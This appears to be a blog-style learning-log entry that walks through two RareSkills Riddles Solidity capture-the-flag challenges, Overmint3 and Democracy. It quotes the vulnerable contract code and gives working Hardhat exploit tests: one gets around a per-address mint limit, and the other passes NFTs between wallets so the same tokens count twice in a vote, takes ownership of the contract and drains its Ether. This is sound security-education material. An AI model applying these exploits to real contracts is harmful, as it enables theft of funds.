
## Day 16 msg.sender spoofing

### RareSkills Riddles: Overmint3

Overmint3 is a very simple ERC721 NFT.  The objective here is to have a total of five tokens and do this in one transaction.  Let's take a look at the public ```mint()``` function.  

```Java
    function mint() external {
        require(!msg.sender.isContract(), "no contracts");
        require(amountMinted[msg.sender] < 1, "only 1 NFT");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }
```

There is a check to make sure that the caller is an EOA not a contract, and the amount minted is checked by address.  We cannot use a contract to directly attack this.  The exploit comes in the problem statement, we are trying to own five tokens, and one address can only mint one token.  This doesn't say anything about an address owning more than one token.  So we could have five different addresses each mint one token and then send those tokens to the attacker.  That is what is done and passes the challenge.  

```Javascript 
    describe("exploit", async function () {
        let victimContract, attackerWallet, extras
        before(async function () {
            ({ victimContract, attackerWallet, extras } = await loadFixture(setup));
        })

        it("conduct your attack here", async function () {
            await victimContract.connect(attackerWallet).mint();
            await victimContract.connect(extras[0]).mint();
            await victimContract.connect(extras[0]).transferFrom(extras[0].address, attackerWallet.address, 2);
            await victimContract.connect(extras[1]).mint();
            await victimContract.connect(extras[1]).transferFrom(extras[1].address, attackerWallet.address, 3);
            await victimContract.connect(extras[2]).mint();
            await victimContract.connect(extras[2]).transferFrom(extras[2].address, attackerWallet.address, 4);
            await victimContract.connect(extras[3]).mint();
            await victimContract.connect(extras[3]).transferFrom(extras[3].address, attackerWallet.address, 5);
        });
```

### RareSkills Riddles: Democracy

Democracy is an NFT voting system and we, the attacker are the challenger.  The incumbant has rigged the election so that once our vote has been cast they will be delcared the winner so rather than fight this injustice our job is to rob them and take off.  The objective is to drain the contract of its 1 Ether, and hopefully we can swing the election to our favor.    

The Democracy contract is quite large at 181 lines, there are a number of things to note.  The first thing is the ```_rigElection()``` method.  

```Java
    function _rigElection() private {
        // Mint voting tokens to challenger
        _mint(challenger, 0);
        _mint(challenger, 1);

        // Make it look like a close election...
        votes[incumbent] = 5;
        votes[challenger] = 3;
    }

    function _callElection() private {
        electionCalled = true;

        if (votes[challenger] > votes[incumbent]) {
            incumbent = challenger;
            _transferOwnership(challenger);

            challenger = address(0);
        }
    }

    function withdrawToAddress(address address_) external onlyOwner {
        payable(address_).call{value: address(this).balance}("");
    }
```

This method gives us two NFTs to vote with.  The second thing to note is that the incumbant has five votes and we have three, so we will need to use more than the two provided NFTs to vote.  In the ```_callElection()``` method we see that if we win the election we will take ownership of the contract, and with ownership we can call ```withdrawToAddress()``` to extract all the Ether.  Very interesting.  Now we just need to figure out how to win the election.  

Now let's look at the voting function: 

```Java
    function vote(address nominee)
        external
        contractBalanceIsGreaterThanZero
        electionNotYetCalled
        nomineeIsValid(nominee)
        hodlerNotYetVoted
    {
        // Check NFT balance
        uint256 hodlerNftBalance = balanceOf(msg.sender);
        require(
            hodlerNftBalance > 0,
            "DemocracyNft: Voting only for NFT hodlers"
        );

        // Log votes
        votes[nominee] += hodlerNftBalance;
        voted[msg.sender] = true;

        // Tip hodler for doing their civic duty
        payable(msg.sender).call{value: address(this).balance / 10}("");

        // Once all hodlers have voted, call election
        if (votes[incumbent] + votes[challenger] >= TOTAL_SUPPLY_CAP) {
            _callElection();
        }
    }

    modifier hodlerNotYetVoted() {
        require(!voted[msg.sender], "DemocracyNft: One hodler, one vote");
        _;
    }
```

In ```vote()``` there are a number of modifiers used they check: the election is still going on, the contract sill holds Ether, the nominee is valid, and the hodler has not yet voted.  THe last item is check by msg.sender.  In fact all accounting is done by msg.sender not the the NFT id.  There is a balance check also done by msg.sender.  In many methods in the contract it requires the caller to not be a contract, however there is no check on that in ```vote()```, so we can call it with a contract and do some sort of reentrancy attack.  Since everything is checked by address we can create a contract that votes for the challenger (with two votes) then does a reentrancy attack by transfering one (or two) tokens to another entity and voting again.  There is some code preventing this.  

```Java
    function approve(address to, uint256 tokenId)
        public
        override
        callerIsNotAContract
    {
        _approve(to, tokenId);
    }

    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public override callerIsNotAContract {
        require(
            _isApprovedOrOwner(_msgSender(), tokenId),
            "ERC721: caller is not token owner or approved"
        );

        _transfer(from, to, tokenId);
    }

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public override callerIsNotAContract {
        require(
            _isApprovedOrOwner(_msgSender(), tokenId),
            "ERC721: caller is not token owner or approved"
        );

        _safeTransfer(from, to, tokenId, "");
    }
```

The above code says that our attack contract cannot call any of these methods.  So we will have to call them with our EOA.  Here is the modified attack: 1. nominate the attacker EOA as the challenger 2. transfer one token to the attack contract 3. vote one time 4. transfer the second token to the attack contract.  5. have the attack contract vote (no reentrancy needed).

```Javascript
    it("conduct your attack here", async function () {
      // 1. nominate the attacker EOA as the challenger
      await victimContract.connect(owner).nominateChallenger(attackerWallet.address);

      // 2. transfer one token to the attack contract
      await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attacker2Wallet.address, 0);

      // 3. vote one time (as attacker)
      await victimContract.connect(attackerWallet).vote(attackerWallet.address);

      // 4. transfer the second token to the attack contract.  
      await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attacker2Wallet.address, 1);

      // 5. have the attack contract vote (no reentrancy needed).
      await victimContract.connect(attacker2Wallet).vote(attackerWallet.address);

      // 6. attacker wins the election and withdraws the balance
      await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
    });
```